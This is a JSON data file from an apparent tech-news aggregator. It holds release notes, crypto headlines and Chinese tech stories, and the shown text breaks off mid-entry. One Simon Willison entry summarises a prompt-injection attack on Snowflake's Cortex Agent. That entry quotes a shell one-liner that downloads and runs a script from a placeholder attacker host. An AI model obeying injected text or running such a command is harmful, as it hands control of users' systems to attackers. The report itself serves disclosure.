@@ -1,0 +1,812 @@
+{
+  "generated_at": "2026-03-18T19:00:17.589407+00:00",
+  "today_jst": "2026-03-19",
+  "stats": {
+    "rss_fetched": 27,
+    "rss_errors": 12,
+    "github_fetched": 11,
+    "reddit_fetched": 9
+  },
+  "total_articles": 364,
+  "topic_distribution": {
+    "llm": 69,
+    "ai-agent": 7,
+    "crypto": 110,
+    "frontier-tech": 178
+  },
+  "web_search_queries": {
+    "llm": [
+      "LLM latest news today",
+      "large language model breakthroughs",
+      "GPT Claude Gemini updates"
+    ],
+    "ai-agent": [
+      "AI Agent latest developments",
+      "autonomous agent framework news"
+    ],
+    "crypto": [
+      "cryptocurrency bitcoin ethereum latest news",
+      "DeFi blockchain development"
+    ],
+    "frontier-tech": [
+      "artificial intelligence breakthroughs",
+      "frontier technology latest"
+    ],
+    "space-science": [
+      "space exploration latest news",
+      "scientific breakthroughs today"
+    ],
+    "consumer-tech": [
+      "consumer electronics hardware news today",
+      "Apple Google Samsung product launches"
+    ],
+    "cybersecurity": [
+      "cybersecurity breach vulnerability news today",
+      "zero-day exploit latest"
+    ],
+    "biotech": [
+      "biotech health tech AI drug discovery news"
+    ]
+  },
+  "articles_by_topic": {
+    "llm": [
+      {
+        "source_id": "ollama",
+        "source_name": "ollama/ollama",
+        "source_type": "github",
+        "title": "[GitHub] ollama/ollama: v0.18.2-rc0",
+        "url": "https://github.com/ollama/ollama/releases/tag/v0.18.2-rc0",
+        "summary": "What's Changed\n\nsched: Model eviction for MLX by @jessegross in #14569\nmlx: add prequantized tensor packing + changes for qwen35 by @pdevine in #14878\nmlx: quantized embeddings, fast SwiGLU, and runtime fixes by @pdevine in #14884\ncloud_proxy: for the web_search legacy path, flush on newlines by @dr",
+        "published": "2026-03-18T09:02:25+00:00",
+        "topics": [
+          "llm"
+        ],
+        "priority": true,
+        "quality_score": 13
+      },
+      {
+        "source_id": "pytorch",
+        "source_name": "pytorch/pytorch",
+        "source_type": "github",
+        "title": "[GitHub] pytorch/pytorch: viable/strict/1773855581: [overlap] extract runtime_estimations from OverlapScheduler (#175174)",
+        "url": "https://github.com/pytorch/pytorch/releases/tag/viable%2Fstrict%2F1773855581",
+        "summary": "The main idea is decoupling runtime estimations gathering into a separate function, that can be used without scheduling OverlapScheduler, but the results can be fed into it, to avoid double measuring.\nThe usecase is using it in simulations of scheduling.\nruntime_estimations depend on fusion_regions ",
+        "published": "2026-03-18T13:10:16+00:00",
+        "topics": [
+          "llm",
+          "frontier-tech"
+        ],
+        "priority": true,
+        "quality_score": 13
+      },
+      {
+        "source_id": "pytorch",
+        "source_name": "pytorch/pytorch",
+        "source_type": "github",
+        "title": "[GitHub] pytorch/pytorch: viable/strict/1773839495: Fix conditional-uninitialized warnings (round 2) (#175678) (#175678)",
+        "url": "https://github.com/pytorch/pytorch/releases/tag/viable%2Fstrict%2F1773839495",
+        "summary": "Summary:\nIn preparation for promoting conditional-uninitialized to a compiler error at Meta, this diff initializes variables to safe defaults.\nTest Plan: builds on D92969284\nReviewed By: nausicaasnow\nDifferential Revision: D93137190\nPull Request resolved: #175678\nApproved by: https://github.com/Skyl",
+        "published": "2026-03-18T08:17:04+00:00",
+        "topics": [
+          "llm",
+          "frontier-tech"
+        ],
+        "priority": true,
+        "quality_score": 13
+      },
+      {
+        "source_id": "pytorch",
+        "source_name": "pytorch/pytorch",
+        "source_type": "github",
+        "title": "[GitHub] pytorch/pytorch: viable/strict/1773837300: Use FloorDiv and Mod instead of // and % on sympy exprs (#177051)",
+        "url": "https://github.com/pytorch/pytorch/releases/tag/viable%2Fstrict%2F1773837300",
+        "summary": "Fixes #162868. Continuation of #175755.\nInductor call sites use Python % and // on raw sympy symbols, which create sympy.Mod and sympy.floor -- different types from the torch.utils._sympy.functions.Mod/FloorDiv that torch._check installs as axioms. This causes statically_known_true to miss divisibil",
+        "published": "2026-03-18T07:48:39+00:00",
+        "topics": [
+          "llm",
+          "frontier-tech"
+        ],
+        "priority": true,
+        "quality_score": 13
+      },
+      {
+        "source_id": "pytorch",
+        "source_name": "pytorch/pytorch",
+        "source_type": "github",
+        "title": "[GitHub] pytorch/pytorch: viable/strict/1773828459",
+        "url": "https://github.com/pytorch/pytorch/releases/tag/viable%2Fstrict%2F1773828459",
+        "summary": "Replace traceback.extract_stack() with sys._getframe(1) in Library.__…",
+        "published": "2026-03-18T05:53:48+00:00",
+        "topics": [
+          "llm",
+          "frontier-tech"
+        ],
+        "priority": true,
+        "quality_score": 13
+      },
+      {
+        "source_id": "ollama",
+        "source_name": "ollama/ollama",
+        "source_type": "github",
+        "title": "[GitHub] ollama/ollama: v0.18.1-rc0: cmd/launch: skip --install-daemon when systemd is unavailable (#14883)",
+        "url": "https://github.com/ollama/ollama/releases/tag/v0.18.1-rc0",
+        "summary": "In container environments without systemd, openclaw onboard --install-daemon exits non-zero because it cannot create a systemd\nuser service. This causes ollama launch openclaw to abort even\nthough the gateway can be started as a foreground child process.\nOnly pass --install-daemon when systemd user ",
+        "published": "2026-03-16T20:50:04+00:00",
+        "topics": [
+          "llm"
+        ],
+        "priority": true,
+        "quality_score": 11
+      }
+    ],
+    "ai-agent": [
+      {
+        "source_id": "langchain",
+        "source_name": "langchain-ai/langchain",
+        "source_type": "github",
+        "title": "[GitHub] langchain-ai/langchain: langchain-core==1.2.20",
+        "url": "https://github.com/langchain-ai/langchain/releases/tag/langchain-core%3D%3D1.2.20",
+        "summary": "Changes since langchain-core==1.2.19\nrelease(core): 1.2.20 (#36085)\nfix(core): trace invocation params in metadata (#36080)\nfeat: Add LangSmith integration metadata to create_agent and init_chat_model (#35810)\nfeat(core): harden anti-ssrf (#35960)\nci: avoid unnecessary dep installs in lint targets (",
+        "published": "2026-03-18T17:34:58+00:00",
+        "topics": [
+          "ai-agent"
+        ],
+        "priority": true,
+        "quality_score": 13
+      },
+      {
+        "source_id": "langchain",
+        "source_name": "langchain-ai/langchain",
+        "source_type": "github",
+        "title": "[GitHub] langchain-ai/langchain: langchain-anthropic==1.4.0",
+        "url": "https://github.com/langchain-ai/langchain/releases/tag/langchain-anthropic%3D%3D1.4.0",
+        "summary": "Changes since langchain-anthropic==1.3.5\nrelease(anthropic): 1.4 (#36018)\nfeat(anthropic): AnthropicPromptCachingMiddleware: apply explicit caching to system message and tool definitions (#35969)\nfeat(anthropic): delegate cache_control kwarg to anthropic top-level param (#35967)\nchore(model-profiles",
+        "published": "2026-03-17T18:42:48+00:00",
+        "topics": [
+          "ai-agent"
+        ],
+        "priority": true,
+        "quality_score": 11
+      },
+      {
+        "source_id": "langchain",
+        "source_name": "langchain-ai/langchain",
+        "source_type": "github",
+        "title": "[GitHub] langchain-ai/langchain: langchain-mistralai==1.1.2",
+        "url": "https://github.com/langchain-ai/langchain/releases/tag/langchain-mistralai%3D%3D1.1.2",
+        "summary": "Changes since langchain-mistralai==1.1.1\nrelease(mistralai): 1.1.2 (#35835)\nfeat(model-profiles): new fields + Makefile target (#35788)\nfix(model-profiles): sort generated profiles by model ID for stable diffs (#35344)\nchore: bump model profiles (#35294)\nfix(mistralai): update test (#35270)\nfix(mist",
+        "published": "2026-03-13T14:13:19+00:00",
+        "topics": [
+          "ai-agent"
+        ],
+        "priority": true,
+        "quality_score": 11
+      },
+      {
+        "source_id": "openclaw",
+        "source_name": "openclaw/openclaw",
+        "source_type": "github",
+        "title": "[GitHub] openclaw/openclaw: openclaw 2026.3.13-beta.1",
+        "url": "https://github.com/openclaw/openclaw/releases/tag/v2026.3.13-beta.1",
+        "summary": "Pre-release for npm beta tag v2026.3.13-beta.1.\nmacOS assets are built with stable app version 2026.3.13 so they can be reused for the later non-beta release. appcast.xml is intentionally unchanged in this pre-release.\nChanges\n\nAndroid/chat settings: redesign the chat settings sheet with grouped dev",
+        "published": "2026-03-14T05:17:10+00:00",
+        "topics": [
+          "ai-agent"
+        ],
+        "priority": true,
+        "quality_score": 11
+      },
+      {
+        "source_id": "crewai",
+        "source_name": "crewAIInc/crewAI",
+        "source_type": "github",
+        "title": "[GitHub] crewAIInc/crewAI: 1.11.0",
+        "url": "https://github.com/crewAIInc/crewAI/releases/tag/1.11.0",
+        "summary": "What's Changed\nDocumentation\n\nUpdate changelog and version for v1.11.0rc2\n\nContributors\n@greysonlalonde",
+        "published": "2026-03-18T13:38:51+00:00",
+        "topics": [
+          "ai-agent"
+        ],
+        "priority": false,
+        "quality_score": 10
+      }
+    ],
+    "crypto": [
+      {
+        "source_id": "bitcoin",
+        "source_name": "bitcoin/bitcoin",
+        "source_type": "github",
+        "title": "[GitHub] bitcoin/bitcoin: v28.4: Bitcoin Core 28.4 final",
+        "url": "https://github.com/bitcoin/bitcoin/releases/tag/v28.4",
+        "summary": "Tree-SHA512: 51bf166dceb7100ec3978a8c27f54d98e01ff115951c3e025bc19dba3c8d2ef5c3242bc1b811b6af7b4e7005dabf99bb5966b68bebf78d4ad970221ccb240ab8",
+        "published": "2026-03-17T00:02:12+00:00",
+        "topics": [
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 11
+      },
+      {
+        "source_id": "bitcoin",
+        "source_name": "bitcoin/bitcoin",
+        "source_type": "github",
+        "title": "[GitHub] bitcoin/bitcoin: v31.0rc1: Bitcoin Core 31.0 release candidate 1",
+        "url": "https://github.com/bitcoin/bitcoin/releases/tag/v31.0rc1",
+        "summary": "Tree-SHA512: 4aa6484be421276d07daa58394569ef667defc19de50e0622f8754acc83ebbc7cfac7a3afcdeacc3a4f72b3787e603b28df154ebaba883d22312ad7d4f377de3",
+        "published": "2026-03-12T05:56:54+00:00",
+        "topics": [
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 11
+      },
+      {
+        "source_id": "coindesk-rss",
+        "source_name": "CoinDesk",
+        "source_type": "rss",
+        "title": "Kalshi co-founder fights back against Arizona’s ‘overstep’ in what a lawyer calls a federal-state turf war",
+        "url": "https://www.coindesk.com/policy/2026/03/18/kalshi-co-founder-fights-back-against-arizona-s-overstep-in-what-a-lawyer-calls-a-federal-state-turf-war",
+        "summary": "",
+        "published": "2026-03-18T18:19:24+00:00",
+        "topics": [
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      },
+      {
+        "source_id": "coindesk-rss",
+        "source_name": "CoinDesk",
+        "source_type": "rss",
+        "title": "Federal Reserve holds policy steady as Iran war adds to growth and inflation concerns",
+        "url": "https://www.coindesk.com/markets/2026/03/18/federal-reserve-holds-policy-steady-as-it-balances-growth-and-inflation-concerns",
+        "summary": "",
+        "published": "2026-03-18T17:59:47+00:00",
+        "topics": [
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      },
+      {
+        "source_id": "coindesk-rss",
+        "source_name": "CoinDesk",
+        "source_type": "rss",
+        "title": "The era of cheap money is over as the Iran war creates a permanent 'inflation floor'",
+        "url": "https://www.coindesk.com/markets/2026/03/18/the-era-of-cheap-money-is-over-as-the-iran-war-creates-a-permanent-inflation-floor",
+        "summary": "",
+        "published": "2026-03-18T17:09:02+00:00",
+        "topics": [
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      }
+    ],
+    "frontier-tech": [
+      {
+        "source_id": "36kr-rss",
+        "source_name": "36氪",
+        "source_type": "rss",
+        "title": "微盟集团2025年来自AI收入破亿，SaaS商业化找到新路径｜最前线",
+        "url": "https://36kr.com/p/3728689823006343?f=rss",
+        "summary": "文｜张子怡\n  编辑｜袁斯来\n  在Open Claw席卷世界的当下，一切价值都有可能被重估。\n  首当其冲的便是传统SaaS企业。\n  Gartner的分析师认为，到2030年，35%的单一功能SaaS工具将被AI Agent取代，或被大型SaaS供应商吸收进更广泛的智能体生态系统中。\n  传统SaaS企业正在被价值重估的当下，国内SaaS企业微盟集团在数年的AI转型下，完成了旗下全线SaaS产品与AI技术的原生融合，并在商业层面验证了AI驱动盈利的可持续性。\n  近日，微盟集团发布2025年报，总收入为人民币15.92亿元，较上年同期增长18.9%。其中，微盟首次披露AI相关年度收入达人民币1.16亿元，下半年收入为0.82亿元，环比上半年增速达137.5%。\n  在微盟集团年报电话会上，面对年初AI智能体引发对SaaS行业的质疑，微盟管理层认为，AI将加速垂类SaaS平台的价值释放。“通用工具类SaaS可能被替代，但具备深厚行业Know-how和底层API调度能力的垂类平台，将受益于AI带来的智能化红利。”\n  在数年“All in AI“的战略下，微盟已构建起一套完整的AI产品",
+        "published": "2026-03-18T17:00:05+00:00",
+        "topics": [
+          "frontier-tech",
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      },
+      {
+        "source_id": "36kr-rss",
+        "source_name": "36氪",
+        "source_type": "rss",
+        "title": "氪星晚报｜新疆新能源外送电量突破3000亿千瓦时；三星电子或发生大规模罢工，恐波及全球半导体产供链；社交平台X调整印尼用户年龄限制以符合新规",
+        "url": "https://36kr.com/p/3728294939966598?f=rss",
+        "summary": "大公司：\n  三星电子或发生大规模罢工，恐波及全球半导体产供链\n  据韩联社18日报道，由超过6.6万名韩国三星电子工会成员参与表决的投票结果显示，93.1%的工会成员赞成罢工。若无重大变化，三星电子工会成员将于5月21日至6月7日全面罢工。据韩联社报道，三星电子作为全球重要的存储芯片制造商，一旦发生罢工，可能进一步加剧由全球人工智能数据中心建设持续升温带来的全球半导体供应趋紧局面，其影响或波及汽车、计算机及智能手机等多个行业。\n  腾讯：四季度营收1943.7亿元，同比增长13%\n  36氪获悉，腾讯发布2025年第四季度及全年财报。财报显示，腾讯四季度营收1943.7亿元，同比增长13%；Non-IFRS经营利润695.2亿元，同比增长17%。全年营收7517.7亿元，同比增长14%；Non-IFRS经营利润同比增长18%。核心业务方面，Q4增值服务收入899.2亿元，同比增长14%，其中游戏业务收入同比增长21%；营销服务收入411.2亿元，同比增长17%；金融科技与企业服务收入608.2亿元，同比增长8%。在AI需求增长、产品创新和供应链优化带动下，腾讯云2025年实现规模化盈",
+        "published": "2026-03-18T10:29:02+00:00",
+        "topics": [
+          "frontier-tech",
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      },
+      {
+        "source_id": "36kr-rss",
+        "source_name": "36氪",
+        "source_type": "rss",
+        "title": "一年卖出515亿，万辰集团怎么做到的？",
+        "url": "https://36kr.com/p/3728249171295363?f=rss",
+        "summary": "万辰集团几乎交出了历史上最好的一份成绩单。&nbsp;\n  3月17日晚间，好想来母公司万辰集团发布了2025年财报。报告期内，万辰集团营业收入为514.59亿元，同比增长59.17%；加回计提股份支付费用后的净利润为25.68亿元，同比增长212.18%；年度经营活动产生的现金流达到36.31亿元。&nbsp;\n  值得关注的是，公司的核心业务“量贩零食”不仅营收高速增长，盈利水平也不断提升。&nbsp;\n  财报显示，2025年万辰集团旗下量贩零食业务营收达508.57亿元，同比增长59.98%；全年毛利率12.32%，同比提升1.46个百分点；加回计提股份支付费用后的净利润为25.33亿元，净利率达到4.98%。&nbsp;\n  进入2025年以来，量贩零食赛道从规模竞争走向质效考验，而万辰集团则用扎实的财报表现给到了市场充分的信心。其自身发起的效率革命，也可被整个行业用作摆脱同质化竞争的教科书。&nbsp;\n  从当下的结果看，万辰集团已凭借出色的产品力、扎实的供应链能力与精细化的会员运营体系，进入了发展的下一阶段。&nbsp;\n  01 零食之王：规模与效率共振\n  回望量贩",
+        "published": "2026-03-18T09:36:25+00:00",
+        "topics": [
+          "frontier-tech",
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      },
+      {
+        "source_id": "36kr-rss",
+        "source_name": "36氪",
+        "source_type": "rss",
+        "title": "2000万只“龙虾”进入企业，阿里的企业Agent新故事 | 最前线",
+        "url": "https://36kr.com/p/3727395193388161?f=rss",
+        "summary": "对钉钉创始人无招而言，在 AI 时代顿悟的瞬间并不是 ChatGPT 横空出世，而是早在 2020 年。第一次离开钉钉时，他游历了大半个中国，调研了许许多多不同的城市，之后所想通的事。\n  “我想明白，AI 时代最颠覆性的变化不是其他，而是使用主体变了。”他看到，在二三线甚至更远的城市，因为互联网使用主体的变化，导致出现了各种各样不一样的应用供给——类似拼多多等应用崛起，就是这个逻辑。\n  而在大模型来了之后，这个判断更加清晰：在 AI 时代，互联网执行主体从人变成了 AI。\n  这个判断也贯穿了钉钉在 3 月 17 日举办的新品发布会。\n  几乎同一时间，阿里在 3 月 16 日宣布几乎是大模型时代以来最重要的战略调整——宣布正式成立 Alibaba Token Hub（ATH）事业群，千问事业部。其中悟空事业部定位为“打造 B 端 AI 应用入口，将模型能力深度融入企业工作流”。\n  \n  来源：钉钉\n  这次发布会发生在阿里在完成关键战略重组之际，也是 ATH 事业群的第一次正式发布。\n  这次钉钉最重要的变化，就是推出了全新的 AI 原生工作平台“悟空”。颇具象征性的是，钉钉所",
+        "published": "2026-03-18T06:06:36+00:00",
+        "topics": [
+          "frontier-tech",
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      },
+      {
+        "source_id": "36kr-rss",
+        "source_name": "36氪",
+        "source_type": "rss",
+        "title": "36氪首发 | 高能粒子应用核心部件公司完成超亿元融资，加速高端仪器、半导体领域国产替代",
+        "url": "https://36kr.com/p/3727812168367238?f=rss",
+        "summary": "作者&nbsp;|&nbsp;张子怡\n  编辑&nbsp;|&nbsp;袁斯来\n  36氪获悉，聚焦高能粒子应用系统核心部件的苏州博思得电气有限公司（以下简称“博思得”）近日宣布完成超亿元C轮融资。本轮融资由上海瑞力领投，交银资本、元璟资本跟投。募集资金将主要用于高端产品研发升级及全球化市场布局。\n  高压发生器、X光射线源是医疗影像、工业无损检测、半导体及高端仪器的核心部件，属于多学科交叉的复杂工程，对产品的性能、一致性、可靠性要求较高，是多众重要核心装备的核心“心脏”部件。其尖端技术与高端市场长期被海外品牌占据。伴随下游医疗与工业高端装备国产化浪潮加速，上游核心部件的自主可控成为产业焦点。\n  博思得作为国内高能粒子核心应用系统领域的标杆企业，专注于特种高压电源、X光射线源、高压发生器等产品的自主研发、生产与销售，产品下游应用领域全面覆盖医疗影像、工业检测、半导体与高端仪器三大核心领域，成为下游产业升级发展的重要核心支撑。\n  目前，博思得已构建起电力电子、高压绝缘技术平台、软件与智能控制、热能管理和材料科学五大技术平台，具备行业领先的高能（100kW）、高压（20-450kV）、",
+        "published": "2026-03-18T02:07:04+00:00",
+        "topics": [
+          "frontier-tech",
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      },
+      {
+        "source_id": "36kr-rss",
+        "source_name": "36氪",
+        "source_type": "rss",
+        "title": "当黄仁勋和吴泳铭喊出同一个英文单词",
+        "url": "https://36kr.com/p/3727806050565251?f=rss",
+        "summary": "文｜邱晓芬\n  编辑｜苏建勋\n  美国旧金山当地时间3月16日，英伟达GTC 2026大会正式开幕。在英伟达创始人兼CEO黄仁勋两个小时慷慨激昂的主题演讲中，贯穿的一个关键词是——Token。\n  \n  △ 黄仁勋，图源：发布会截图&nbsp;\n  无独有偶，在GTC 2026的前一天，阿里巴巴宣布成立Token事业群——这是地位与淘天电商、阿里云一般的核心独立事业群。这个新事业群里，阿里也明确了“创造Token、输送Token、应用Token”链路。\n  Token，是大模型处理文本信息时的基本语义单位。当你输入一段文本时，模型会先通过分词器，将文本切割成一系列Token。这些Token随即被转换为数值向量，被输送到GPU里进行大规模矩阵计算。\n  在过去，AI产业链上的不同角色，有各自关注的指标和评价标准——底层大模型团队关注模型参数规模、上层的应用团队则用户增长和日活跃度，云服务团队关注算力的利用率和实际收入。\n  阿里巴巴CEO吴泳铭在内部指出，AI Agent极度依赖Token，未来将进入一个“需求大爆炸”的时期。\n  而阿里和英伟达此次前后脚强调token，传递的讯号是，在",
+        "published": "2026-03-18T02:02:18+00:00",
+        "topics": [
+          "frontier-tech",
+          "crypto"
+        ],
+        "priority": true,
+        "quality_score": 10
+      }
+    ]
+  },
+  "top_articles": [
+    {
+      "source_id": "ollama",
+      "source_name": "ollama/ollama",
+      "source_type": "github",
+      "title": "[GitHub] ollama/ollama: v0.18.2-rc0",
+      "url": "https://github.com/ollama/ollama/releases/tag/v0.18.2-rc0",
+      "summary": "What's Changed\n\nsched: Model eviction for MLX by @jessegross in #14569\nmlx: add prequantized tensor packing + changes for qwen35 by @pdevine in #14878\nmlx: quantized embeddings, fast SwiGLU, and runtime fixes by @pdevine in #14884\ncloud_proxy: for the web_search legacy path, flush on newlines by @dr",
+      "published": "2026-03-18T09:02:25+00:00",
+      "topics": [
+        "llm"
+      ],
+      "priority": true,
+      "quality_score": 13
+    },
+    {
+      "source_id": "pytorch",
+      "source_name": "pytorch/pytorch",
+      "source_type": "github",
+      "title": "[GitHub] pytorch/pytorch: viable/strict/1773855581: [overlap] extract runtime_estimations from OverlapScheduler (#175174)",
+      "url": "https://github.com/pytorch/pytorch/releases/tag/viable%2Fstrict%2F1773855581",
+      "summary": "The main idea is decoupling runtime estimations gathering into a separate function, that can be used without scheduling OverlapScheduler, but the results can be fed into it, to avoid double measuring.\nThe usecase is using it in simulations of scheduling.\nruntime_estimations depend on fusion_regions ",
+      "published": "2026-03-18T13:10:16+00:00",
+      "topics": [
+        "llm",
+        "frontier-tech"
+      ],
+      "priority": true,
+      "quality_score": 13
+    },
+    {
+      "source_id": "pytorch",
+      "source_name": "pytorch/pytorch",
+      "source_type": "github",
+      "title": "[GitHub] pytorch/pytorch: viable/strict/1773839495: Fix conditional-uninitialized warnings (round 2) (#175678) (#175678)",
+      "url": "https://github.com/pytorch/pytorch/releases/tag/viable%2Fstrict%2F1773839495",
+      "summary": "Summary:\nIn preparation for promoting conditional-uninitialized to a compiler error at Meta, this diff initializes variables to safe defaults.\nTest Plan: builds on D92969284\nReviewed By: nausicaasnow\nDifferential Revision: D93137190\nPull Request resolved: #175678\nApproved by: https://github.com/Skyl",
+      "published": "2026-03-18T08:17:04+00:00",
+      "topics": [
+        "llm",
+        "frontier-tech"
+      ],
+      "priority": true,
+      "quality_score": 13
+    },
+    {
+      "source_id": "pytorch",
+      "source_name": "pytorch/pytorch",
+      "source_type": "github",
+      "title": "[GitHub] pytorch/pytorch: viable/strict/1773837300: Use FloorDiv and Mod instead of // and % on sympy exprs (#177051)",
+      "url": "https://github.com/pytorch/pytorch/releases/tag/viable%2Fstrict%2F1773837300",
+      "summary": "Fixes #162868. Continuation of #175755.\nInductor call sites use Python % and // on raw sympy symbols, which create sympy.Mod and sympy.floor -- different types from the torch.utils._sympy.functions.Mod/FloorDiv that torch._check installs as axioms. This causes statically_known_true to miss divisibil",
+      "published": "2026-03-18T07:48:39+00:00",
+      "topics": [
+        "llm",
+        "frontier-tech"
+      ],
+      "priority": true,
+      "quality_score": 13
+    },
+    {
+      "source_id": "pytorch",
+      "source_name": "pytorch/pytorch",
+      "source_type": "github",
+      "title": "[GitHub] pytorch/pytorch: viable/strict/1773828459",
+      "url": "https://github.com/pytorch/pytorch/releases/tag/viable%2Fstrict%2F1773828459",
+      "summary": "Replace traceback.extract_stack() with sys._getframe(1) in Library.__…",
+      "published": "2026-03-18T05:53:48+00:00",
+      "topics": [
+        "llm",
+        "frontier-tech"
+      ],
+      "priority": true,
+      "quality_score": 13
+    },
+    {
+      "source_id": "langchain",
+      "source_name": "langchain-ai/langchain",
+      "source_type": "github",
+      "title": "[GitHub] langchain-ai/langchain: langchain-core==1.2.20",
+      "url": "https://github.com/langchain-ai/langchain/releases/tag/langchain-core%3D%3D1.2.20",
+      "summary": "Changes since langchain-core==1.2.19\nrelease(core): 1.2.20 (#36085)\nfix(core): trace invocation params in metadata (#36080)\nfeat: Add LangSmith integration metadata to create_agent and init_chat_model (#35810)\nfeat(core): harden anti-ssrf (#35960)\nci: avoid unnecessary dep installs in lint targets (",
+      "published": "2026-03-18T17:34:58+00:00",
+      "topics": [
+        "ai-agent"
+      ],
+      "priority": true,
+      "quality_score": 13
+    },
+    {
+      "source_id": "ollama",
+      "source_name": "ollama/ollama",
+      "source_type": "github",
+      "title": "[GitHub] ollama/ollama: v0.18.1-rc0: cmd/launch: skip --install-daemon when systemd is unavailable (#14883)",
+      "url": "https://github.com/ollama/ollama/releases/tag/v0.18.1-rc0",
+      "summary": "In container environments without systemd, openclaw onboard --install-daemon exits non-zero because it cannot create a systemd\nuser service. This causes ollama launch openclaw to abort even\nthough the gateway can be started as a foreground child process.\nOnly pass --install-daemon when systemd user ",
+      "published": "2026-03-16T20:50:04+00:00",
+      "topics": [
+        "llm"
+      ],
+      "priority": true,
+      "quality_score": 11
+    },
+    {
+      "source_id": "langchain",
+      "source_name": "langchain-ai/langchain",
+      "source_type": "github",
+      "title": "[GitHub] langchain-ai/langchain: langchain-anthropic==1.4.0",
+      "url": "https://github.com/langchain-ai/langchain/releases/tag/langchain-anthropic%3D%3D1.4.0",
+      "summary": "Changes since langchain-anthropic==1.3.5\nrelease(anthropic): 1.4 (#36018)\nfeat(anthropic): AnthropicPromptCachingMiddleware: apply explicit caching to system message and tool definitions (#35969)\nfeat(anthropic): delegate cache_control kwarg to anthropic top-level param (#35967)\nchore(model-profiles",
+      "published": "2026-03-17T18:42:48+00:00",
+      "topics": [
+        "ai-agent"
+      ],
+      "priority": true,
+      "quality_score": 11
+    },
+    {
+      "source_id": "langchain",
+      "source_name": "langchain-ai/langchain",
+      "source_type": "github",
+      "title": "[GitHub] langchain-ai/langchain: langchain-mistralai==1.1.2",
+      "url": "https://github.com/langchain-ai/langchain/releases/tag/langchain-mistralai%3D%3D1.1.2",
+      "summary": "Changes since langchain-mistralai==1.1.1\nrelease(mistralai): 1.1.2 (#35835)\nfeat(model-profiles): new fields + Makefile target (#35788)\nfix(model-profiles): sort generated profiles by model ID for stable diffs (#35344)\nchore: bump model profiles (#35294)\nfix(mistralai): update test (#35270)\nfix(mist",
+      "published": "2026-03-13T14:13:19+00:00",
+      "topics": [
+        "ai-agent"
+      ],
+      "priority": true,
+      "quality_score": 11
+    },
+    {
+      "source_id": "openclaw",
+      "source_name": "openclaw/openclaw",
+      "source_type": "github",
+      "title": "[GitHub] openclaw/openclaw: openclaw 2026.3.13-beta.1",
+      "url": "https://github.com/openclaw/openclaw/releases/tag/v2026.3.13-beta.1",
+      "summary": "Pre-release for npm beta tag v2026.3.13-beta.1.\nmacOS assets are built with stable app version 2026.3.13 so they can be reused for the later non-beta release. appcast.xml is intentionally unchanged in this pre-release.\nChanges\n\nAndroid/chat settings: redesign the chat settings sheet with grouped dev",
+      "published": "2026-03-14T05:17:10+00:00",
+      "topics": [
+        "ai-agent"
+      ],
+      "priority": true,
+      "quality_score": 11
+    },
+    {
+      "source_id": "bitcoin",
+      "source_name": "bitcoin/bitcoin",
+      "source_type": "github",
+      "title": "[GitHub] bitcoin/bitcoin: v28.4: Bitcoin Core 28.4 final",
+      "url": "https://github.com/bitcoin/bitcoin/releases/tag/v28.4",
+      "summary": "Tree-SHA512: 51bf166dceb7100ec3978a8c27f54d98e01ff115951c3e025bc19dba3c8d2ef5c3242bc1b811b6af7b4e7005dabf99bb5966b68bebf78d4ad970221ccb240ab8",
+      "published": "2026-03-17T00:02:12+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 11
+    },
+    {
+      "source_id": "bitcoin",
+      "source_name": "bitcoin/bitcoin",
+      "source_type": "github",
+      "title": "[GitHub] bitcoin/bitcoin: v31.0rc1: Bitcoin Core 31.0 release candidate 1",
+      "url": "https://github.com/bitcoin/bitcoin/releases/tag/v31.0rc1",
+      "summary": "Tree-SHA512: 4aa6484be421276d07daa58394569ef667defc19de50e0622f8754acc83ebbc7cfac7a3afcdeacc3a4f72b3787e603b28df154ebaba883d22312ad7d4f377de3",
+      "published": "2026-03-12T05:56:54+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 11
+    },
+    {
+      "source_id": "simonwillison-rss",
+      "source_name": "Simon Willison",
+      "source_type": "rss",
+      "title": "Snowflake Cortex AI Escapes Sandbox and Executes Malware",
+      "url": "https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything",
+      "summary": "Snowflake Cortex AI Escapes Sandbox and Executes Malware\nPromptArmor report on a prompt injection attack chain in Snowflake's Cortex Agent, now fixed.\nThe attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.\nThe attack caused the agent to execute this code:\ncat &lt; &lt;(sh &lt; &lt;(wget -q0- https://ATTACKER_URL.com/bugbot))\n\nCortex listed cat commands as safe to run without human approval, withou",
+      "published": "2026-03-18T17:43:49+00:00",
+      "topics": [
+        "llm",
+        "ai-agent",
+        "frontier-tech"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "simonwillison-rss",
+      "source_name": "Simon Willison",
+      "source_type": "rss",
+      "title": "Quoting Ken Jin",
+      "url": "https://simonwillison.net/2026/Mar/17/ken-jin/#atom-everything",
+      "summary": "Great news—we’ve hit our (very modest) performance goals for the CPython JIT over a year early for macOS AArch64, and a few months early for x86_64 Linux. The 3.15 alpha JIT is about 11-12% faster on macOS AArch64 than the tail calling interpreter, and 5-6%faster than the standard interpreter on x86_64 Linux.\n&mdash; Ken Jin, Python 3.15’s JIT is now back on track\n\n    Tags: python",
+      "published": "2026-03-17T21:48:26+00:00",
+      "topics": [
+        "llm",
+        "ai-agent",
+        "frontier-tech"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "simonwillison-rss",
+      "source_name": "Simon Willison",
+      "source_type": "rss",
+      "title": "GPT-5.4 mini and GPT-5.4 nano, which can describe 76,000 photos for $52",
+      "url": "https://simonwillison.net/2026/Mar/17/mini-and-nano/#atom-everything",
